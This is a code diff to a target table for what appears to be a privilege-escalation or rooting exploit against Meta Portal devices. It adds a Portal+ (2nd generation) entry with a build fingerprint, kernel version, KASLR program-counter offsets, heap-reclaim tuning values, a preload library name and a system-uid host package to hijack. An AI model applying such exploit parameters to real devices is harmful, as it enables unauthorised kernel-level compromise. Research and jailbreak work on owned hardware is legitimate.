@@ -26,6 +26,10 @@ class PortalTarget:
     mm_recycle_slabs: int = 0
     reclaim_pairs: int = 64
     reclaim_sends: int = 64
+    exploit_timeout_seconds: int = 300
+    recover_watch_result_after_disconnect: bool = False
+    uid1000_host_package: str = "com.facebook.alohasdk.platformbatterystate"
+    uid1000_host_label: str = "platformbatterystate"
     audio_java_fallback: bool = False
     audio_installer_credentials: bool = False
     device_owner_system_credentials: bool = False
@@ -67,6 +71,36 @@ TARGETS = (
             0x136E,
             0x3A72,
         ),
+    ),
+    PortalTarget(
+        key="portal-plus-cipher-4051355900018050",
+        model="Meta Portal+ (2nd generation)",
+        device="cipher",
+        fingerprint=(
+            "Facebook/cipher_prod/cipher:10/QKQ1.210213.001/"
+            "4051355900018050:user/prod-keys"
+        ),
+        kernel="4.9.227-perf+",
+        preload_name="preload-portal-cipher-4051355900018050.so",
+        make_target="portal-cipher-4051355900018050",
+        kaslr_pc_offsets=(
+            0x3D7E,
+            0x3D54,
+            0x153C,
+            0x11756DC,
+            0x1175724,
+            0x363C6,
+            0xAF90E,
+            0x136E,
+            0x3A72,
+        ),
+        product_models=("Portal+",),
+        reclaim_pairs=256,
+        reclaim_sends=256,
+        exploit_timeout_seconds=120,
+        recover_watch_result_after_disconnect=True,
+        uid1000_host_package="com.facebook.alohasdk.platformsecurestate",
+        uid1000_host_label="platformsecurestate",
     ),
     PortalTarget(
         key="portal-plus-aloha-1041515800015050",
